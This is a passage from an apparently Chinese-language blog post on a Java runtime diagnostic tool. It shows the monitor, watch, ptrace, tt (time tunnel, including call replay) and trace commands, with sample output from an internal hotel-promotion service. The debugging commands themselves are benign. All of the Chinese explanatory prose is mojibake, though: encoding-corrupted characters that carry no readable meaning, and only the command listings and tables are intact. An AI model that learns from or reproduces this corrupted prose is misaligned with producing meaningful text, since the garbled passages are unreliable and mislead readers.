java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1130)  |</span><br><span class="line">|       |        |               |                      | at : java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)  |</span><br><span class="line">|       |        |               |                      | at : java.lang.Thread.run(Thread.java:744)                                            |</span><br><span class="line">+-------+--------+---------------+----------------------+---------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢æ˜¾ç¤ºçš„å°±æ˜¯top3å ç”¨cpuçš„çº¿ç¨‹</p>
<h4 id="monitor-â€”â€”-ç›‘æ§æ–¹æ³•çš„æ‰§è¡Œæ—¶é—´"><a href="#monitor-â€”â€”-ç›‘æ§æ–¹æ³•çš„æ‰§è¡Œæ—¶é—´" class="headerlink" title="monitor â€”â€” ç›‘æ§æ–¹æ³•çš„æ‰§è¡Œæ—¶é—´"></a>monitor â€”â€” ç›‘æ§æ–¹æ³•çš„æ‰§è¡Œæ—¶é—´</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;monitor -c2 com.domain.Bean   someMethod   </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 103 ms.</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| TIMESTAMP           | CLASS              | METHOD                     | TOTAL | SUCCESS | FAIL | FAIL-RATE | AVG-RT(ms) | MIN-RT(ms) | MAX-RT(ms) |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br><span class="line">| 2017-11-12 17:09:18 | com.domain.Bean    | someMethod                 | 4     | 4       | 0    | 00.00%    | 13.25      | 11         | 17         |</span><br><span class="line">+---------------------+--------------------+----------------------------+-------+---------+------+-----------+------------+------------+------------+</span><br></pre></td></tr></table></figure>
<h4 id="watch-â€”â€”-å…¨æ–¹ä½ç›‘æ§"><a href="#watch-â€”â€”-å…¨æ–¹ä½ç›‘æ§" class="headerlink" title="watch â€”â€” å…¨æ–¹ä½ç›‘æ§"></a>watch â€”â€” å…¨æ–¹ä½ç›‘æ§</h4><p>watchå¯ä»¥ç›‘æ§æ–¹æ³•çš„è¿”å›å€¼ï¼Œå…¥å‚ï¼Œè¿˜å¯ä»¥æ ¹æ®æ¡ä»¶ç­›é€‰ï¼ˆæ˜¯å¦æŠ›å‡ºå¼‚å¸¸ï¼Œå“åº”æ—¶é—´ç­‰ï¼‰</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;watch com.domain.Bean onMessage params[0]</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 92 ms.</span><br><span class="line">&#123;&quot;messageId&quot;:&quot;171112.171542.192.168.50.191.31779.22733&quot;&#125;</span><br></pre></td></tr></table></figure>
<h4 id="ttï¼ˆtime-tunelï¼‰å’Œptrace"><a href="#ttï¼ˆtime-tunelï¼‰å’Œptrace" class="headerlink" title="ttï¼ˆtime tunelï¼‰å’Œptrace"></a>ttï¼ˆtime tunelï¼‰å’Œptrace</h4><p>å…ˆè¯´ptraceï¼Œ è¿™ä¸ªå’Œtraceå·®ä¸å¤šï¼Œ åªæ˜¯å¯ä»¥åŠ ä¸Š<code>-t</code>å°†è°ƒç”¨å­˜å‚¨èµ·æ¥ï¼Œå¯ä»¥é…åˆ<code>tt</code>ä½¿ç”¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1 com.domain.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:22) cost in 163 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;process=1002;</span><br><span class="line">    `---[21,21ms]com.domain.Bean:doSend(); index=1001;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure></p>
<p><code>tt</code>:</p>
<blockquote>
<p>æ—¶é—´éš§é“å‘½ä»¤æ˜¯æˆ‘åœ¨ä½¿ç”¨watchå‘½ä»¤è¿›è¡Œé—®é¢˜æ’æŸ¥çš„æ—¶å€™è¡ç”Ÿå‡ºæ¥çš„æƒ³æ³•ã€‚<br>watchè™½ç„¶å¾ˆæ–¹ä¾¿å’Œçµæ´»ï¼Œä½†éœ€è¦æå‰æƒ³æ¸…æ¥šè§‚å¯Ÿè¡¨è¾¾å¼çš„æ‹¼å†™ï¼Œè¿™å¯¹æ’æŸ¥é—®é¢˜è€Œè¨€è¦æ±‚å¤ªé«˜ï¼Œå› ä¸ºå¾ˆå¤šæ—¶å€™æˆ‘ä»¬å¹¶ä¸æ¸…æ¥šé—®é¢˜å‡ºè‡ªäºä½•æ–¹ï¼Œåªèƒ½é è››ä¸é©¬è¿¹è¿›è¡ŒçŒœæµ‹.<br>è¿™ä¸ªæ—¶å€™å¦‚æœèƒ½è®°å½•ä¸‹å½“æ—¶æ–¹æ³•è°ƒç”¨çš„æ‰€æœ‰å…¥å‚å’Œè¿”å›å€¼ã€æŠ›å‡ºçš„å¼‚å¸¸ä¼šå¯¹æ•´ä¸ªé—®é¢˜çš„æ€è€ƒä¸åˆ¤æ–­éå¸¸æœ‰å¸®åŠ©ã€‚<br>äºæ˜¯ä¹ï¼ŒTimeTunnelå‘½ä»¤å°±è¯ç”Ÿäº†ã€‚</p>
</blockquote>
<p>åˆ—å‡ºæ‰€æœ‰æ—¶é—´ç‰‡æ®µæˆ–æ˜¾ç¤ºä¸€ä¸ªæ—¶é—´ç‰‡æ®µçš„å†…å®¹:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tt -l</span><br><span class="line">tt -i 1001</span><br></pre></td></tr></table></figure>
<p>å†…å®¹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -l</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1001 |       1002 |  2017-11-12 17:30:40 |         20 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1002 |       1003 |  2017-11-12 17:30:41 |         10 |     true |    false |      0x55e9f734 |                           Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">ga?&gt;tt -i 1001</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1001                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1002                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:30:40                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 20                                                                                                                                                     |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x55e9f734                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.domain.Bean                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | doSend                                                                                                                                                 |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[0] | 242996952                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[1] | [CouponBase[id=1,amount=5]                                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[2] | VoucherSendTask[appName=catalysis,batchSeriesNum=catalysis-train_give_zhoubian-HOURROOM_NEWUSER-HOURROOM,transactionId=catalysis24299695225174650HOURR] |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ | InventoryRecord[activityId=31,transactionId=catalysis24299695225174650HOURROOM242996952]                                                                |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;http-8080-179&quot; thread_id=0x505;is_daemon=true;priority=5;                                                                                 |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.service.impl.Bean.doSend(Bean.java:179)                                    |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.service.impl.Bean.sendVoucherThenGetCouponId(Bean.java:191)          |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.open.promotion.provider.controller.benefit.UserBenefitController.voucherSendThenGetCouponId(UserBenefitController.java: |</span><br><span class="line">|                 | 841)                                                                                                                                                   |</span><br><span class="line">|                 |         at sun.reflect.GeneratedMethodAccessor1923.invoke(null:-1)                                                                                     |</span><br><span class="line">|                 |         at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)                                                       |</span><br><span class="line">|                 |         at java.lang.reflect.Method.invoke(Method.java:606)                                                                                            |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:214)                                       |</span><br><span class="line">|                 |         at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:132)                             |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:748 |</span><br><span class="line">|                 | )                                                                                                                                                      |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:689)    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83)                        |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945)                                                    |</span><br><span class="line">|                 |         at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:876)                                                     |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:931)                                                  |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:833)                                                          |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:637)                                                                                |</span><br><span class="line">|                 |         at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:807)                                                         |</span><br><span class="line">|                 |         at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)                                                                                |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:140)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at com.qunar.hotel.qta.base.trace.HttpTraceFilter.doFilter(HttpTraceFilter.java:44)                                                            |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at qunar.ServletWatcher.doFilter(ServletWatcher.java:118)                                                                                      |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:88)                                    |</span><br><span class="line">|                 |         at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:108)                                                 |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)                                           |</span><br><span class="line">|                 |         at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)                                                         |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)                                                               |</span><br><span class="line">|                 |         at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:555)                                                                   |</span><br><span class="line">|                 |         at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)                                                           |</span><br><span class="line">|                 |         at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)                                                                 |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:857)                                                                  |</span><br><span class="line">|                 |         at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)                                            |</span><br><span class="line">|                 |         at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)                                                                     |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>é™¤äº†ä½¿ç”¨<code>ptrace</code>ä¿å­˜æ—¶é—´ç‰‡æ®µï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨<code>tt</code>ï¼Œ</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;tt -t  -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 110 ms.</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1003 |       1004 |  2017-11-12 17:37:27 |         10 |     true |    false |      0x55e9f734 |         Bean |                         doSend |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br></pre></td></tr></table></figure>
<p><em>åŒæ ·çš„æœ€å¥½æŒ‡å®š-nï¼Œé¿å…é«˜å¹¶å‘ä¸‹é€ æˆå¤ªå¤§å½±å“</em></p>
<p>è§£å†³æ–¹æ³•é‡è½½</p>
<p>tt -t *Test print params[0].length==1</p>
<p>é€šè¿‡åˆ¶å®šå‚æ•°ä¸ªæ•°çš„å½¢å¼è§£å†³ä¸åŒçš„æ–¹æ³•ç­¾åï¼Œå¦‚æœå‚æ•°ä¸ªæ•°ä¸€æ ·ï¼Œä½ è¿˜å¯ä»¥è¿™æ ·å†™</p>
<p>tt -t *Test print â€˜params[1].class == Integer.classâ€™</p>
<p>è§£å†³æŒ‡å®šå‚æ•°</p>
<p>tt -t *Test print params[0].mobile==â€13989838402â€</p>
<p>å…·ä½“çš„å¯ä»¥å‚è§å‚è€ƒæ–‡æ¡£é‡Œçš„è¯´æ˜ã€‚</p>
<ul>
<li><code>tt</code>çš„å¦å¤–ä¸€ä¸ªä¾¿åˆ©ä¹‹å¤„æ˜¯å¯ä»¥å¯¹ä¿å­˜çš„æ—¶é—´ç‰‡ä¸»åŠ¨å‘èµ·ä¸€æ¬¡è°ƒç”¨</li>
</ul>
<p>å’Œdubboçš„æ³›åŒ–è°ƒç”¨ä¸€æ ·ï¼Œ<code>tt</code>çš„è¿™ä¸ªæ–¹æ³•ä¹Ÿå¯ä»¥å¤§å¤§é™ä½æ²Ÿé€šçš„æˆæœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;ptrace -t  -n 1  *com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener onMessage </span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:2) cost in 126 ms.</span><br><span class="line">`---+pTracing for : thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=true;priority=5;process=1005;</span><br><span class="line">    `---[1,1ms]com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener:onMessage(); index=1004;</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|    INDEX | PROCESS-ID |            TIMESTAMP |   COST(ms) |   IS-RET |   IS-EXP |          OBJECT |                          CLASS |                         METHOD |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line">|     1004 |       1005 |  2017-11-12 17:43:15 |          2 |     true |    false |      0x14b7937c | BookingPromotionRollBackListen |                      onMessage |</span><br><span class="line">|          |            |                      |            |          |          |                 |                             er |                                |</span><br><span class="line">+----------+------------+----------------------+------------+----------+----------+-----------------+--------------------------------+--------------------------------+</span><br><span class="line"></span><br><span class="line">ga?&gt;tt -i 1004 -p</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           INDEX | 1004                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      PROCESS-ID | 1005                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      GMT-CREATE | 2017-11-12 17:43:15                                                                                                                                    |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|        COST(ms) | 1                                                                                                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          OBJECT | 0x14b7937c                                                                                                                                             |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           CLASS | com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener                                                                      |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|          METHOD | onMessage                                                                                                                                              |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|       IS-RETURN | true                                                                                                                                                   |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|    IS-EXCEPTION | false                                                                                                                                                  |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|   PARAMETERS[0] | &#123;&quot;messageId&quot;:&quot;171112.174315.192.168.50.191.31779.22906&quot;&#125;                                                                                               |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|      RETURN-OBJ |                                                                                                                                                        |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">|           STACK | thread_name=&quot;anon-com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.&lt;clinit&gt;:33-thread-2&quot; thread_id=0x205;is_daemon=tr |</span><br><span class="line">|                 | ue;priority=5;                                                                                                                                         |</span><br><span class="line">|                 |     @com.qunar.hotel.qta.open.promotion.flow.listener.BookingPromotionRollBackListener.onMessage(BookingPromotionRollBackListener.java:45)             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.ConsumerMessage.process(ConsumerMessage.java:105)                                                             |</span><br><span class="line">|                 |         at qunar.tc.qmq.consumer.handler.MessageHandler$1.run(MessageHandler.java:57)                                                                  |</span><br><span class="line">|                 |         at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)                                                                     |</span><br><span class="line">|                 |         at java.util.concurrent.FutureTask.run(FutureTask.java:262)                                                                                    |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)                                                             |</span><br><span class="line">|                 |         at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)                                                             |</span><br><span class="line">|                 |         at java.lang.Thread.run(Thread.java:744)                                                                                                       |</span><br><span class="line">+-----------------+--------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">Time fragment[1004] successfully replayed.</span><br></pre></td></tr></table></figure>
<h4 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h4><p>æ˜¾ç¤ºæŒ‡å®šæ–¹æ³•è°ƒç”¨çš„æ ˆï¼Œå¸¦æ—¶é—´æ¶ˆè€—ã€‚ç®€å•çš„å¯ä»¥çœ‹ä¸‹è°ƒç”¨é“¾ä¸Šçš„è€—æ—¶ï¼Œè¿›ä¸€æ­¥çš„è¯å°±éœ€è¦æ›´åŠ ä¸“ä¸šçš„<code>JProfiler</code>ç­‰å·¥å…·äº†</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ga?&gt;trace -n 1 com.qunar.hotel.qta.open.promotion.service.impl.Bean doSend</span><br><span class="line">Press Ctrl+D to abort.</span><br><span class="line">Affect(class-cnt:1 , method-cnt:1) cost in 102 ms.</span><br><span class="line">`---+Tracing for : thread_name=&quot;http-8080-181&quot; thread_id=0x507;is_daemon=true;priority=5;</span><br><span class="line">    `---+[13,13ms]com.qunar.hotel.qta.open.promotion.service.impl.Bean:doSend()</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.coupon.api.bean.CouponUser:&lt;init&gt;(@175)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getVoucherTypeId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:&lt;init&gt;(@176)</span><br><span class="line">        +---[0,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getTransactionId(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:append(@176)</span><br><span class="line">        +---[0,0ms]java.lang.StringBuilder:toString(@176)</span><br><span class="line">        +---[12,12ms]com.qunar.hotel.qta.coupon.api.remote.ActivityWriteRemote:consume(@176)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getAppName(@177)</span><br><span class="line">        +---[12,0ms]com.qunar.hotel.qta.open.promotion.bean.voucher.VoucherSendTask:getBatchSeriesNum(@177)</span><br><span class="line">        +---[12,0ms]java.lang.Long:valueOf(@177)</span><br><span class="line">        +---[12,0ms]java.util.List:size(@177)</span><br><span class="line">        +---[13,0ms]java.lang.Integer:valueOf(@177)</span><br><span class="line">        `---[13,0ms]org.slf4j.Logger:info(@177)</span><br></pre></td></tr></table></figure>
<p>æœ€å¥½ä¹ŸæŒ‡å®šä¸‹<code>-n</code></p>
